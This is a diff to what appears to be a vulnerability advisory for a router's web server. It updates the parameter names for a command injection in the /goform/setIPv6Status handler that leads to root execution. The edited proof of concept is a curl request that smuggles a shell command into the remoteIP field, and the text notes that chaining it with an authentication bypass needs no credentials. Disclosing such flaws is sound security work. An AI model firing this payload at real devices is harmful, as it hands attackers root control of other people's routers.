@@ -4,16 +4,16 @@
 
 ## Analysis
 
-In the httpd binary, the function `formSetIPv6status` handles requests to `/goform/setIPv6Status`. The `serverIPAddr` parameter is stored in NVRAM without sanitization. The `multiWAN` binary later uses this value in `doSystemCmd("ip tunnel add %s mode sit remote %s local %s ttl 255")`, which calls `system()`, allowing arbitrary command execution as root.
+In the httpd binary, the function `formSetIPv6status` handles requests to `/goform/setIPv6Status`. The `remoteIP` parameter (for 6in4 tunnel configuration) is stored in NVRAM key `ipv6.tun6in4.remoteip` without sanitization. The `multiWAN` binary later uses this value in `doSystemCmd("ip tunnel add %s mode sit remote %s local %s ttl 255")`, which calls `system()`, allowing arbitrary command execution as root.
 
 This endpoint requires authentication. Combined with the [authentication bypass](../auth_bypass/detail.md), it can be exploited without credentials from the LAN.
 
-![Ghidra showing unsanitized serverIPAddr](screenshots/1.png)
+![Ghidra showing unsanitized remoteIP parameter](screenshots/1.png)
 
 ## POC
 
 ```
-curl -i -X POST "http://192.168.0.1/goform/setIPv6Status?reasy-ui-1.0.3.js" -d "ipv6Enable=1&ipv6WanType=6in4&serverIPAddr=1.2.3.4;id>/tmp/pwned&localIPAddr=10.0.0.1"
+curl -i -X POST "http://192.168.0.1/goform/setIPv6Status?reasy-ui-1.0.3.js" -d "IPv6En=1&conType=6in4&remoteIP=1.2.3.4;id>/tmp/pwned&intfIPv6=2001::1/64"
 ```
 
 ![PoC result](screenshots/2.png)
